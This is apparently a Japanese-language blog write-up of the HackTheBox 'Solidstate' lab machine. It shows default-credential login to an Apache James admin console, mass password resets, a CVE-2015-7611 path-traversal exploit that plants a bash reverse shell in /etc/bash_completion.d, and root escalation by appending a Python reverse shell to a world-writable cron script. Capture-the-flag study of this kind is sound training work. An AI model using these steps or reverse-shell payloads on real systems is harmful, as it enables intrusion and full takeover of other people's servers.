+++
title = "HackTheBox - Solidstate Writeup"
date = "2026-04-23"
description = "Apache James 2.3.2のデフォルト資格情報とCVE-2015-7611を利用した初期侵入、world-writableスクリプトによる権限昇格"
tags = ["HackTheBox", "CTF", "Linux", "CVE-2015-7611", "Apache James", "rbash escape", "cron", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Solidstate |
| OS | Linux (Debian) |
| Difficulty | Easy |
| IP | 10.129.23.166 |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -p- --min-rate 10000 10.129.23.166 -oN ports.txt
ports=$(grep ^[0-9] ports.txt | cut -d'/' -f1 | tr '\n' ',')
nmap -sV -sC -p $ports 10.129.23.166 -oN detail.txt
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp    Apache James SMTP Server 2.3.2
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3    Apache James POP3 Server 2.3.2
119/tcp  open  nntp    Apache James NNTP Server 2.3.2
4555/tcp open  rsip    Apache James Remote Administration Tool 2.3.2
```

ポート4555にApache James Remote Administration Toolが動いている。

---

## Initial Access - Apache James Admin Console

### デフォルト資格情報でログイン

```bash
nc 10.129.23.166 4555
```

```text
Login id: root
Password: root
```

### ユーザー列挙とパスワードリセット

```
listusers
setpassword james hoge
setpassword thomas hoge
setpassword john hoge
setpassword mindy hoge
setpassword mailadmin hoge
adduser ../../../../../../../../etc/bash_completion.d exploit
```

`adduser ../../../../../../../../etc/bash_completion.d exploit` はCVE-2015-7611のパストラバーサル悪用。
Jamesはメールを `/home/[username]/maildir/` に保存するため、ユーザー名にパストラバーサルを仕込むことで
メール本文を `/etc/bash_completion.d/` に書き込める。
`/etc/bash_completion.d/` はSSHログイン時にbashが自動読み込みするディレクトリのため、RCEが可能になる。

---

## SSH Credentials via POP3

各ユーザーのメールをPOP3で確認する。

```bash
telnet 10.129.23.166 110
```

```text
USER mindy
+OK
PASS hoge
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
```

```text
Subject: Your Access

Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your
password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor
to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@
```

SSH資格情報を取得。

---

## Payload Generation

リバースシェルのペイロードをメール本文に仕込む。

```bash
/bin/bash -i >& /dev/tcp/10.10.16.166/4444 0>&1
```

---

## Delivery - SMTPでペイロード送信

```bash
telnet 10.129.23.166 25
```

```text
EHLO x
MAIL FROM:<attacker@test.com>
RCPT TO:<../../../../../../../../etc/bash_completion.d>
DATA
From: attacker@test.com
To: ../../../../../../../../etc/bash_completion.d
Subject: exploit

/bin/bash -i >& /dev/tcp/10.10.16.166/4444 0>&1

.
QUIT
```

---

## Listener

```bash
nc -lvnp 4444
```

---

## Trigger - SSHログインでペイロード発火

```bash
ssh mindy@10.129.23.166
```

SSHログイン時にbashが `/etc/bash_completion.d/` を読み込み、ペイロードが実行される。

```text
connect to [10.10.16.166] from (UNKNOWN) [10.129.23.166] 48844
/bin/sh: 0: can't access tty; job control turned off
#
```

---

## Foothold

```bash
whoami
```

```text
mindy
```

mindyはrbash（制限付きシェル）のため、SSH接続時に `-t "bash"` オプションでアクセスする。

```bash
ssh mindy@10.129.23.166 -t "bash"
```

---

## System Info

```bash
uname -a
```

```text
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux
```

---

## Post Exploitation

```bash
ls -la /opt/
cat /opt/tmp.py
```

```text
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

`/opt/tmp.py` はworld-writable（`-rwxrwxrwx`）でrootのcronによって定期実行されている。

---

## Results

- `/opt/tmp.py` がworld-writableかつrootのcronで実行される
- ファイルを改ざんすることでroot権限でのコマンド実行が可能

---

## Privilege Escalation

新しいリスナーを起動しておく：

```bash
nc -lvnp 5555
```

`/opt/tmp.py` にリバースシェルを追記：

```bash
echo "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('10.10.16.166',5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])" >> /opt/tmp.py
```

数分待つとcronが実行され、rootシェルが飛んでくる。

---

## Root Shell

```bash
whoami
```

```text
root
```

---

## Flags

### User

```bash
cat /home/mindy/user.txt
```

### Root

```bash
cat /root/root.txt
```


---

## Summary

Apache James 2.3.2のデフォルト資格情報（root:root）でAdmin Consoleにログイン
→ CVE-2015-7611のパストラバーサルでリバースシェルを `/etc/bash_completion.d/` に配置
→ mindyのSSHログインでペイロード発火・フットホールド取得
→ rbash脱出後、world-writableな `/opt/tmp.py` にリバースシェルを追記
→ rootのcron実行でroot権限取得
